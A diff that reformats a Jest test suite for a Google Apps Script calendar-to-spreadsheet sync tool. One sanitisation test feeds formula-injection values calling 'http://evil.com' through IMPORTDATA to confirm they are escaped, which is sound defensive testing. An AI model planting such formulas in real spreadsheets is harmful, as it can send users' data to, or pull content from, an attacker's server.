@@ -1120,167 +1120,220 @@ describe('Checkpoint logic (GAS only)', () => {
   })
 
   test('fullResyncCalendarToSheetGAS deletes rows for a specific config', () => {
-    const code = require('../code.gs');
-
-    global.SYNC_CONFIGS = [{ spreadsheetId: 'ss1', sheetName: 'Sheet1', calendarId: '' }];
-
-    const ss = SpreadsheetApp.openById('ss1');
-    const sheet = ss.getSheetByName('Sheet1');
-    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
-    sheet.__getRows().push(['old1'], ['old2']);
-    sheet.deleteRows = jest.fn();
-
-    code.fullResyncCalendarToSheetGAS(0);
-
-    expect(sheet.deleteRows).toHaveBeenCalledWith(2, 2);
-
-    delete global.SYNC_CONFIGS;
-  });
-
-  test('fullResyncCalendarToSheetGAS deletes rows for all configs', () => {
-    const code = require('../code.gs');
-
-    global.SYNC_CONFIGS = [{ spreadsheetId: 'ss1', sheetName: 'Sheet1', calendarId: '' }];
-
-    const ss = SpreadsheetApp.openById('ss1');
-    const sheet = ss.getSheetByName('Sheet1');
-    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
-    sheet.__getRows().push(['old1'], ['old2']);
-    sheet.deleteRows = jest.fn();
-
-    code.fullResyncCalendarToSheetGAS();
-
-    expect(sheet.deleteRows).toHaveBeenCalledWith(2, 2);
-
-    delete global.SYNC_CONFIGS;
-  });
-
-  test('fullResyncCalendarToSheetGAS logs errors when clearing configs', () => {
-    const code = require('../code.gs');
+    const code = require('../code.gs')
 
     global.SYNC_CONFIGS = [
-      { spreadsheetId: 'invalid_ss', sheetName: 'BadSheet', calendarId: 'bad_cal' }
-    ];
+      { spreadsheetId: 'ss1', sheetName: 'Sheet1', calendarId: '' },
+    ]
 
-    const originalOpenById = SpreadsheetApp.openById;
+    const ss = SpreadsheetApp.openById('ss1')
+    const sheet = ss.getSheetByName('Sheet1')
+    sheet.__setHeader([
+      'id',
+      'title',
+      'start',
+      'end',
+      'description',
+      'location',
+      'attendees',
+    ])
+    sheet.__getRows().push(['old1'], ['old2'])
+    sheet.deleteRows = jest.fn()
+
+    code.fullResyncCalendarToSheetGAS(0)
+
+    expect(sheet.deleteRows).toHaveBeenCalledWith(2, 2)
+
+    delete global.SYNC_CONFIGS
+  })
+
+  test('fullResyncCalendarToSheetGAS deletes rows for all configs', () => {
+    const code = require('../code.gs')
+
+    global.SYNC_CONFIGS = [
+      { spreadsheetId: 'ss1', sheetName: 'Sheet1', calendarId: '' },
+    ]
+
+    const ss = SpreadsheetApp.openById('ss1')
+    const sheet = ss.getSheetByName('Sheet1')
+    sheet.__setHeader([
+      'id',
+      'title',
+      'start',
+      'end',
+      'description',
+      'location',
+      'attendees',
+    ])
+    sheet.__getRows().push(['old1'], ['old2'])
+    sheet.deleteRows = jest.fn()
+
+    code.fullResyncCalendarToSheetGAS()
+
+    expect(sheet.deleteRows).toHaveBeenCalledWith(2, 2)
+
+    delete global.SYNC_CONFIGS
+  })
+
+  test('fullResyncCalendarToSheetGAS logs errors when clearing configs', () => {
+    const code = require('../code.gs')
+
+    global.SYNC_CONFIGS = [
+      {
+        spreadsheetId: 'invalid_ss',
+        sheetName: 'BadSheet',
+        calendarId: 'bad_cal',
+      },
+    ]
+
+    const originalOpenById = SpreadsheetApp.openById
     SpreadsheetApp.openById = jest.fn(() => {
-      throw new Error('Spreadsheet not found');
-    });
+      throw new Error('Spreadsheet not found')
+    })
 
-    global.Logger = { log: jest.fn() };
+    global.Logger = { log: jest.fn() }
 
     expect(() => {
-      code.fullResyncCalendarToSheetGAS();
-    }).not.toThrow();
+      code.fullResyncCalendarToSheetGAS()
+    }).not.toThrow()
 
-    expect(global.Logger.log).toHaveBeenCalled();
+    expect(global.Logger.log).toHaveBeenCalled()
 
-    SpreadsheetApp.openById = originalOpenById;
-    delete global.SYNC_CONFIGS;
-    delete global.Logger;
-  });
+    SpreadsheetApp.openById = originalOpenById
+    delete global.SYNC_CONFIGS
+    delete global.Logger
+  })
 
   test('tail merge avoids a tiny trailing chunk', () => {
-    const code = require('../code.gs');
+    const code = require('../code.gs')
 
-    delete global.SYNC_CONFIGS;
-    delete global.SPREADSHEET_ID;
-    delete global.SHEET_NAME;
-    delete global.CALENDAR_ID;
+    delete global.SYNC_CONFIGS
+    delete global.SPREADSHEET_ID
+    delete global.SHEET_NAME
+    delete global.CALENDAR_ID
 
-    global.SPREADSHEET_ID = 'ss1';
-    global.SHEET_NAME = 'Sheet1';
+    global.SPREADSHEET_ID = 'ss1'
+    global.SHEET_NAME = 'Sheet1'
 
-    const ss = SpreadsheetApp.openById('ss1');
-    const sheet = ss.getSheetByName('Sheet1');
-    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
+    const ss = SpreadsheetApp.openById('ss1')
+    const sheet = ss.getSheetByName('Sheet1')
+    sheet.__setHeader([
+      'id',
+      'title',
+      'start',
+      'end',
+      'description',
+      'location',
+      'attendees',
+    ])
 
-    const props = PropertiesService.getUserProperties();
-    const originalGetUserProperties = PropertiesService.getUserProperties;
-    PropertiesService.getUserProperties = () => props;
-    const setPropSpy = jest.spyOn(props, 'setProperty');
+    const props = PropertiesService.getUserProperties()
+    const originalGetUserProperties = PropertiesService.getUserProperties
+    PropertiesService.getUserProperties = () => props
+    const setPropSpy = jest.spyOn(props, 'setProperty')
 
-    const startIso = '2025-01-01T00:00:00.000Z';
-    const endIso = new Date(new Date(startIso).getTime() + (365 * 24 * 60 * 60 * 1000) + (5 * 60 * 1000)).toISOString();
+    const startIso = '2025-01-01T00:00:00.000Z'
+    const endIso = new Date(
+      new Date(startIso).getTime() + 365 * 24 * 60 * 60 * 1000 + 5 * 60 * 1000
+    ).toISOString()
 
-    code.syncCalendarToSheetGAS(startIso, endIso);
+    code.syncCalendarToSheetGAS(startIso, endIso)
 
-    expect(setPropSpy).toHaveBeenCalledTimes(1);
+    expect(setPropSpy).toHaveBeenCalledTimes(1)
 
-    setPropSpy.mockRestore();
-    PropertiesService.getUserProperties = originalGetUserProperties;
-    delete global.SPREADSHEET_ID;
-    delete global.SHEET_NAME;
-  });
+    setPropSpy.mockRestore()
+    PropertiesService.getUserProperties = originalGetUserProperties
+    delete global.SPREADSHEET_ID
+    delete global.SHEET_NAME
+  })
 
   test('tail merge avoids a tiny trailing chunk for multi-config sync', () => {
-    const code = require('../code.gs');
+    const code = require('../code.gs')
 
-    global.SYNC_CONFIGS = [{ spreadsheetId: 'ss1', sheetName: 'Sheet1', calendarId: '' }];
+    global.SYNC_CONFIGS = [
+      { spreadsheetId: 'ss1', sheetName: 'Sheet1', calendarId: '' },
+    ]
 
-    const ss = SpreadsheetApp.openById('ss1');
-    const sheet = ss.getSheetByName('Sheet1');
-    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
+    const ss = SpreadsheetApp.openById('ss1')
+    const sheet = ss.getSheetByName('Sheet1')
+    sheet.__setHeader([
+      'id',
+      'title',
+      'start',
+      'end',
+      'description',
+      'location',
+      'attendees',
+    ])
 
-    const props = PropertiesService.getUserProperties();
-    const originalGetUserProperties = PropertiesService.getUserProperties;
-    PropertiesService.getUserProperties = () => props;
-    const setPropSpy = jest.spyOn(props, 'setProperty');
+    const props = PropertiesService.getUserProperties()
+    const originalGetUserProperties = PropertiesService.getUserProperties
+    PropertiesService.getUserProperties = () => props
+    const setPropSpy = jest.spyOn(props, 'setProperty')
 
-    const startIso = '2025-01-01T00:00:00.000Z';
-    const endIso = new Date(new Date(startIso).getTime() + (365 * 24 * 60 * 60 * 1000) + (5 * 60 * 1000)).toISOString();
+    const startIso = '2025-01-01T00:00:00.000Z'
+    const endIso = new Date(
+      new Date(startIso).getTime() + 365 * 24 * 60 * 60 * 1000 + 5 * 60 * 1000
+    ).toISOString()
 
-    code.syncAllCalendarsToSheetsGAS(startIso, endIso);
+    code.syncAllCalendarsToSheetsGAS(startIso, endIso)
 
-    expect(setPropSpy).toHaveBeenCalledTimes(1);
+    expect(setPropSpy).toHaveBeenCalledTimes(1)
 
-    setPropSpy.mockRestore();
-    PropertiesService.getUserProperties = originalGetUserProperties;
-    delete global.SYNC_CONFIGS;
-  });
+    setPropSpy.mockRestore()
+    PropertiesService.getUserProperties = originalGetUserProperties
+    delete global.SYNC_CONFIGS
+  })
 
   test('syncCalendarToSheetGAS logs warning when max iterations reached', () => {
-    const code = require('../code.gs');
+    const code = require('../code.gs')
 
-    delete global.SYNC_CONFIGS;
-    delete global.SPREADSHEET_ID;
-    delete global.SHEET_NAME;
-    delete global.CALENDAR_ID;
+    delete global.SYNC_CONFIGS
+    delete global.SPREADSHEET_ID
+    delete global.SHEET_NAME
+    delete global.CALENDAR_ID
 
-    global.SPREADSHEET_ID = 'ss1';
-    global.SHEET_NAME = 'Sheet1';
+    global.SPREADSHEET_ID = 'ss1'
+    global.SHEET_NAME = 'Sheet1'
 
-    const logSpy = jest.spyOn(console, 'log').mockImplementation(() => {});
+    const logSpy = jest.spyOn(console, 'log').mockImplementation(() => {})
 
-    const start = new Date('1900-01-01T00:00:00.000Z');
-    const end = new Date(start.getTime() + (365 * 24 * 60 * 60 * 1000) * 101);
+    const start = new Date('1900-01-01T00:00:00.000Z')
+    const end = new Date(start.getTime() + 365 * 24 * 60 * 60 * 1000 * 101)
 
-    code.syncCalendarToSheetGAS(start.toISOString(), end.toISOString());
+    code.syncCalendarToSheetGAS(start.toISOString(), end.toISOString())
 
-    expect(logSpy).toHaveBeenCalledWith('[syncCalendarToSheetGAS] Warning: reached maximum iteration limit');
+    expect(logSpy).toHaveBeenCalledWith(
+      '[syncCalendarToSheetGAS] Warning: reached maximum iteration limit'
+    )
 
-    logSpy.mockRestore();
-    delete global.SPREADSHEET_ID;
-    delete global.SHEET_NAME;
-  });
+    logSpy.mockRestore()
+    delete global.SPREADSHEET_ID
+    delete global.SHEET_NAME
+  })
 
   test('syncAllCalendarsToSheetsGAS logs warning when max iterations reached', () => {
-    const code = require('../code.gs');
+    const code = require('../code.gs')
 
-    global.SYNC_CONFIGS = [{ spreadsheetId: 'ss1', sheetName: 'Sheet1', calendarId: '' }];
+    global.SYNC_CONFIGS = [
+      { spreadsheetId: 'ss1', sheetName: 'Sheet1', calendarId: '' },
+    ]
 
-    const logSpy = jest.spyOn(console, 'log').mockImplementation(() => {});
+    const logSpy = jest.spyOn(console, 'log').mockImplementation(() => {})
 
-    const start = new Date('1900-01-01T00:00:00.000Z');
-    const end = new Date(start.getTime() + (365 * 24 * 60 * 60 * 1000) * 101);
+    const start = new Date('1900-01-01T00:00:00.000Z')
+    const end = new Date(start.getTime() + 365 * 24 * 60 * 60 * 1000 * 101)
 
-    code.syncAllCalendarsToSheetsGAS(start.toISOString(), end.toISOString());
+    code.syncAllCalendarsToSheetsGAS(start.toISOString(), end.toISOString())
 
-    expect(logSpy).toHaveBeenCalledWith('[syncAllCalendarsToSheetsGAS] Warning: reached maximum iteration limit for calendar', '');
+    expect(logSpy).toHaveBeenCalledWith(
+      '[syncAllCalendarsToSheetsGAS] Warning: reached maximum iteration limit for calendar',
+      ''
+    )
 
-    logSpy.mockRestore();
-    delete global.SYNC_CONFIGS;
-  });
+    logSpy.mockRestore()
+    delete global.SYNC_CONFIGS
+  })
 
   test('getConfigs returns legacy single config when SYNC_CONFIGS not defined', () => {
     // Clear existing configs
@@ -1447,91 +1500,107 @@ describe('Checkpoint logic (GAS only)', () => {
   })
 
   test('getConfigs handles empty array SYNC_CONFIGS', () => {
-    delete global.SYNC_CONFIGS;
-    global.SYNC_CONFIGS = [];
+    delete global.SYNC_CONFIGS
+    global.SYNC_CONFIGS = []
 
-    delete require.cache[require.resolve('../code.gs')];
-    const freshCode = require('../code.gs');
-    
-    const configs = freshCode.getConfigs();
-    
+    delete require.cache[require.resolve('../code.gs')]
+    const freshCode = require('../code.gs')
+
+    const configs = freshCode.getConfigs()
+
     // Should fall back to legacy mode when array is empty
-    expect(configs.length).toBe(1);
-    expect(configs[0].sheetName).toBe('Sheet1');
-    expect(configs[0].spreadsheetId).toBe(null);
-    expect(configs[0].calendarId).toBe(null);
-    
-    delete global.SYNC_CONFIGS;
-  });
+    expect(configs.length).toBe(1)
+    expect(configs[0].sheetName).toBe('Sheet1')
+    expect(configs[0].spreadsheetId).toBe(null)
+    expect(configs[0].calendarId).toBe(null)
+
+    delete global.SYNC_CONFIGS
+  })
 
   test('syncCalendarToSheetGAS handles empty SYNC_CONFIGS gracefully', () => {
-    const code = require('../code.gs');
-    
+    const code = require('../code.gs')
+
     // Set empty SYNC_CONFIGS
-    delete global.SYNC_CONFIGS;
-    global.SYNC_CONFIGS = [];
-    
+    delete global.SYNC_CONFIGS
+    global.SYNC_CONFIGS = []
+
     // This should not throw even with empty SYNC_CONFIGS
-    const ss = SpreadsheetApp.getActiveSpreadsheet();
-    const sheet = ss.getSheetByName('Sheet1');
-    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
-    
-    const calendar = CalendarApp.getDefaultCalendar();
-    const evt = createCalendarEvent({ 
-      id: 'e_empty_cfg', 
-      title: 'Empty Config Test', 
-      start: new Date('2026-02-02T10:00:00Z'), 
-      end: new Date('2026-02-02T11:00:00Z'), 
-      description: '', 
-      location: '', 
-      attendees: [] 
-    });
-    calendar.__addEvent(evt);
+    const ss = SpreadsheetApp.getActiveSpreadsheet()
+    const sheet = ss.getSheetByName('Sheet1')
+    sheet.__setHeader([
+      'id',
+      'title',
+      'start',
+      'end',
+      'description',
+      'location',
+      'attendees',
+    ])
+
+    const calendar = CalendarApp.getDefaultCalendar()
+    const evt = createCalendarEvent({
+      id: 'e_empty_cfg',
+      title: 'Empty Config Test',
+      start: new Date('2026-02-02T10:00:00Z'),
+      end: new Date('2026-02-02T11:00:00Z'),
+      description: '',
+      location: '',
+      attendees: [],
+    })
+    calendar.__addEvent(evt)
 
     // Should not throw
     expect(() => {
-      code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');
-    }).not.toThrow();
+      code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03')
+    }).not.toThrow()
 
     // Should still sync to the default spreadsheet/sheet
-    expect(sheet.__getRows().find(r => r[0] === 'e_empty_cfg')).toBeTruthy();
-    
-    delete global.SYNC_CONFIGS;
-  });
+    expect(sheet.__getRows().find((r) => r[0] === 'e_empty_cfg')).toBeTruthy()
+
+    delete global.SYNC_CONFIGS
+  })
 
   test('syncAllCalendarsToSheetsGAS handles empty SYNC_CONFIGS gracefully', () => {
-    const code = require('../code.gs');
-    
+    const code = require('../code.gs')
+
     // Set empty SYNC_CONFIGS
-    delete global.SYNC_CONFIGS;
-    global.SYNC_CONFIGS = [];
-    
-    const ss = SpreadsheetApp.getActiveSpreadsheet();
-    const sheet = ss.getSheetByName('Sheet1');
-    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
-    
-    const calendar = CalendarApp.getDefaultCalendar();
-    const evt = createCalendarEvent({ 
-      id: 'e_empty_all', 
-      title: 'Empty All Test', 
-      start: new Date('2026-02-02T10:00:00Z'), 
-      end: new Date('2026-02-02T11:00:00Z'), 
-      description: '', 
-      location: '', 
-      attendees: [] 
-    });
-    calendar.__addEvent(evt);
+    delete global.SYNC_CONFIGS
+    global.SYNC_CONFIGS = []
+
+    const ss = SpreadsheetApp.getActiveSpreadsheet()
+    const sheet = ss.getSheetByName('Sheet1')
+    sheet.__setHeader([
+      'id',
+      'title',
+      'start',
+      'end',
+      'description',
+      'location',
+      'attendees',
+    ])
+
+    const calendar = CalendarApp.getDefaultCalendar()
+    const evt = createCalendarEvent({
+      id: 'e_empty_all',
+      title: 'Empty All Test',
+      start: new Date('2026-02-02T10:00:00Z'),
+      end: new Date('2026-02-02T11:00:00Z'),
+      description: '',
+      location: '',
+      attendees: [],
+    })
+    calendar.__addEvent(evt)
 
     // Should not throw
     expect(() => {
-      code.syncAllCalendarsToSheetsGAS('2026-02-01', '2026-02-03');
-    }).not.toThrow();
+      code.syncAllCalendarsToSheetsGAS('2026-02-01', '2026-02-03')
+    }).not.toThrow()
 
     // Should still sync to the default spreadsheet/sheet
-    expect(sheet.__getRows().find(r => r[0] === 'e_empty_all')).toBeTruthy();
-    
-    delete global.SYNC_CONFIGS;
-  });
+    expect(sheet.__getRows().find((r) => r[0] === 'e_empty_all')).toBeTruthy()
+
+    delete global.SYNC_CONFIGS
+  })
 
   test('getCheckpointKey handles default calendar', () => {
     const code = require('../code.gs')
@@ -1682,31 +1751,44 @@ describe('Checkpoint logic (GAS only)', () => {
   })
 
   test('_syncCalendarToSheetGAS skips empty rows and deletes removed events', () => {
-    const code = require('../code.gs');
+    const code = require('../code.gs')
 
-    global.SPREADSHEET_ID = 'ss1';
-    global.SHEET_NAME = 'Sheet1';
+    global.SPREADSHEET_ID = 'ss1'
+    global.SHEET_NAME = 'Sheet1'
 
-    const ss = SpreadsheetApp.openById('ss1');
-    const sheet = ss.getSheetByName('Sheet1');
-    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
+    const ss = SpreadsheetApp.openById('ss1')
+    const sheet = ss.getSheetByName('Sheet1')
+    sheet.__setHeader([
+      'id',
+      'title',
+      'start',
+      'end',
+      'description',
+      'location',
+      'attendees',
+    ])
 
-    sheet.__getRows().push([]);
+    sheet.__getRows().push([])
 
-    const calendar = CalendarApp.getDefaultCalendar();
-    const evt1 = createCalendarEvent({ id: 'e_skip', title: 'Skip Test', start: new Date('2026-02-02T10:00:00Z'), end: new Date('2026-02-02T11:00:00Z') });
-    calendar.__addEvent(evt1);
+    const calendar = CalendarApp.getDefaultCalendar()
+    const evt1 = createCalendarEvent({
+      id: 'e_skip',
+      title: 'Skip Test',
+      start: new Date('2026-02-02T10:00:00Z'),
+      end: new Date('2026-02-02T11:00:00Z'),
+    })
+    calendar.__addEvent(evt1)
 
-    code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');
+    code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03')
 
-    calendar.__reset();
-    const deleteRowSpy = jest.spyOn(sheet, 'deleteRow');
-    code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');
-    expect(deleteRowSpy).toHaveBeenCalled();
+    calendar.__reset()
+    const deleteRowSpy = jest.spyOn(sheet, 'deleteRow')
+    code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03')
+    expect(deleteRowSpy).toHaveBeenCalled()
 
-    delete global.SPREADSHEET_ID;
-    delete global.SHEET_NAME;
-  });
+    delete global.SPREADSHEET_ID
+    delete global.SHEET_NAME
+  })
 
   test('syncAllCalendarsToSheetsGAS logs errors when Logger is available', () => {
     const code = require('../code.gs')
@@ -2269,41 +2351,41 @@ test('eventToRow does not sanitize values with formula chars not at effective st
 
 // Test formula injection sanitization with leading whitespace/control characters
 test('eventToRow sanitizes values with leading whitespace/control chars followed by formula metacharacters', () => {
-  const evt = createCalendarEvent({ 
-    id: 'e_whitespace_formula', 
-    title: ' =IMPORTDATA("http://evil.com")', 
-    start: new Date('2026-02-02T10:00:00Z'), 
-    end: new Date('2026-02-02T11:00:00Z'), 
-    description: '\t@IMPORTDATA("http://evil.com")', 
-    location: '\n+DANGEROUS', 
-    attendees: [] 
-  });
-  
-  const row = eventToRow(evt);
-  
-  expect(row[1]).toBe("' =IMPORTDATA(\"http://evil.com\")"); // title with leading space sanitized
-  expect(row[4]).toBe("'\t@IMPORTDATA(\"http://evil.com\")"); // description with leading tab sanitized
-  expect(row[5]).toBe("'\n+DANGEROUS"); // location with leading newline sanitized
-});
+  const evt = createCalendarEvent({
+    id: 'e_whitespace_formula',
+    title: ' =IMPORTDATA("http://evil.com")',
+    start: new Date('2026-02-02T10:00:00Z'),
+    end: new Date('2026-02-02T11:00:00Z'),
+    description: '\t@IMPORTDATA("http://evil.com")',
+    location: '\n+DANGEROUS',
+    attendees: [],
+  })
+
+  const row = eventToRow(evt)
+
+  expect(row[1]).toBe('\' =IMPORTDATA("http://evil.com")') // title with leading space sanitized
+  expect(row[4]).toBe('\'\t@IMPORTDATA("http://evil.com")') // description with leading tab sanitized
+  expect(row[5]).toBe("'\n+DANGEROUS") // location with leading newline sanitized
+})
 
 // Test that normal values with dangerous chars in middle are not sanitized
 test('eventToRow does not sanitize values with formula chars not at effective start', () => {
-  const evt = createCalendarEvent({ 
-    id: 'e_safe', 
-    title: 'Meeting @3pm', 
-    start: new Date('2026-02-02T10:00:00Z'), 
-    end: new Date('2026-02-02T11:00:00Z'), 
-    description: 'Cost is $100+tax', 
-    location: 'Room 5-A', 
-    attendees: [] 
-  });
-  
-  const row = eventToRow(evt);
-  
-  expect(row[1]).toBe('Meeting @3pm'); // not sanitized
-  expect(row[4]).toBe('Cost is $100+tax'); // not sanitized
-  expect(row[5]).toBe('Room 5-A'); // not sanitized
-});
+  const evt = createCalendarEvent({
+    id: 'e_safe',
+    title: 'Meeting @3pm',
+    start: new Date('2026-02-02T10:00:00Z'),
+    end: new Date('2026-02-02T11:00:00Z'),
+    description: 'Cost is $100+tax',
+    location: 'Room 5-A',
+    attendees: [],
+  })
+
+  const row = eventToRow(evt)
+
+  expect(row[1]).toBe('Meeting @3pm') // not sanitized
+  expect(row[4]).toBe('Cost is $100+tax') // not sanitized
+  expect(row[5]).toBe('Room 5-A') // not sanitized
+})
 
 // Test historical data preservation (no valid dates)
 test('syncCalendarToSheet preserves rows without valid date columns', async () => {
@@ -2508,33 +2590,41 @@ describe('GAS wrapper functions', () => {
   })
 
   test('syncCalendarToSheetGAS calls ensureHeader when available', async () => {
-    const code = require('../code.gs');
+    const code = require('../code.gs')
 
-    global.SPREADSHEET_ID = 'ss1';
-    global.SHEET_NAME = 'Sheet1';
-    global.ensureHeader = jest.fn();
+    global.SPREADSHEET_ID = 'ss1'
+    global.SHEET_NAME = 'Sheet1'
+    global.ensureHeader = jest.fn()
 
-    const ss = SpreadsheetApp.openById('ss1');
-    const sheet = ss.getSheetByName('Sheet1');
-    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
+    const ss = SpreadsheetApp.openById('ss1')
+    const sheet = ss.getSheetByName('Sheet1')
+    sheet.__setHeader([
+      'id',
+      'title',
+      'start',
+      'end',
+      'description',
+      'location',
+      'attendees',
+    ])
 
-    const calendar = CalendarApp.getDefaultCalendar();
+    const calendar = CalendarApp.getDefaultCalendar()
     const evt = createCalendarEvent({
       id: 'e_header',
       title: 'Header Test',
       start: new Date('2026-02-02T10:00:00Z'),
-      end: new Date('2026-02-02T11:00:00Z')
-    });
-    calendar.__addEvent(evt);
+      end: new Date('2026-02-02T11:00:00Z'),
+    })
+    calendar.__addEvent(evt)
 
-    await code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');
+    await code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03')
 
-    expect(global.ensureHeader).toHaveBeenCalledWith(sheet);
+    expect(global.ensureHeader).toHaveBeenCalledWith(sheet)
 
-    delete global.SPREADSHEET_ID;
-    delete global.SHEET_NAME;
-    delete global.ensureHeader;
-  });
+    delete global.SPREADSHEET_ID
+    delete global.SHEET_NAME
+    delete global.ensureHeader
+  })
 
   test('syncCalendarToSheetGAS handles event deletion', async () => {
     const code = require('../code.gs')
